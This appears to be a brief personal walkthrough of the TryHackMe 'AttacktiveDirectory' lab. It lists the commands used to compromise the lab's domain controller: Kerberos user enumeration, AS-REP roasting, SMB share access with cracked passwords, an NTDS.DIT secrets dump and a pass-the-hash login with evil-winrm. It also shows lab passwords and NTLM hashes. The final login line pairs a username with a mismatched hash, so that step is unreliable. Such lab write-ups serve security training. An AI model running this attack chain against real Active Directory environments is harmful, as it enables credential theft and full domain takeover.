# AttacktiveDirectory

[link to the room](https://tryhackme.com/room/attacktivedirectory)


`export ip=10.10.216.201`


## recon

nmap : `nmap -A -vv -T5 -oN recon/nmap $ip`
kerbrute: `./kerbrute_linux_amd64 userenum --dc $ip -d spookysec.local ~/Personal/ctf/tryhackme/attacktivedirectory/payloads/userlist.txt`

## enumeration

- `svc-admin` & `backup` users
- check with `GetNPUsers.py` to see if there is any users which does not require pre auth.
- crack the hash for `svc-admin`: management2005
- enumerate shares `smbclient -U svc-admin -L 10.10.247.188` or `python smbmap.py -H 10.10.247.188 -u svc-admin -p management2005`
- in `backup` share we found `backup@spookysec.local:backup2517860`
- dump secrets from NTDS.DIT `sudo python3 secretsdump.py -dc-ip 10.10.58.153 spookysec.local/backup:backup2517860@10.10.58.153`
- administrator ntlm hash : `0e0363213e37b94221497260b0bcb4fc`
- use pass the hash attack with evil-winrm : `evil-winrm -i 10.10.58.153 -u svc-admin -H fc0f1e5359e372aa1f69147375ba6809`




